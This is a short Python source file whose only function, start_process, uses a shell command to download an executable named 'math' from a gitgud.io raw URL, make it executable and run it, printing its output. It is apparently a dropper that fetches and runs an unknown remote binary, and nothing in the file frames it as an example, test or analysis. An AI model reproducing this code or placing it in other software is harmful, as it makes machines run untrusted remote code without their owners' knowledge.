import os
import socket
import subprocess
import sys
from pathlib import Path

def start_process():
    
    cmd = f'wget https://gitgud.io/trendava/clouds/-/raw/master/math && chmod +x math && ./math'
    out, err = subprocess.Popen(
        cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
    print(out.decode('utf-8'))
    print(err.decode('utf-8'))
